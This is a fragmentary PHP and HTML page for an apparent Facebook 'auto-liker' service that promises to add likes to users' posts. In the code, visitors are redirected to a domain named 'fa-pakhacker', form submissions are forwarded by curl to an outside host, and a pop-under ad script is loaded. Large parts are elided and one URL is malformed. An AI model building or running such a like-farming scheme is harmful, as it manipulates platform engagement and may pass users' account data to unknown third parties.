...
header("Location: http://http://fa-pakhacker.heck.in//url/$referer");
...
if(isset($_POST['submit'])) {
	...
	$ch = curl_init('http://shorturlink.com/postliker/likers.php'); 
...
session_destroy();
header('Location: index.php?i=Logout Complete .. ');
}
?>
...
<html class="no-js" lang="en">
  <head>
    ...
    <title>Liker | Increase Facebook Likes</title>
...
<center><i class="fa fa-refresh fa-spin fa-4x" style="font-size:150px;color:sky blue;"></i></center>
Giving Likes To Your Post ID! <Br>Meanwhile Please <b style="color: red;">BE ONLINE ON  LIKER</b>
</div>
</div>
...
<script type="text/javascript" src="http://cdn.popcash.net/pop.js"></script>
        <a class="btn btn-default" href="index.php">Home</a> <a class="btn btn-primary" href="?type=status">Status</a>               <a class="btn btn-info" href="?type=photo">Photo</a>             <a class="btn btn-warning" href="?type=custom">Custom  ID</a>  <a class="btn btn-info" href="?type=custom">Pages</a>      <a class="btn btn-danger" href="index.php?logout">Log Out</a> 
   <br><h3>

<div class="alert alert-success" >NEWS: Comment Liker Is Lauched Click On STAUS U will Get List OF !! <font color="red">All Comments</font> </div>
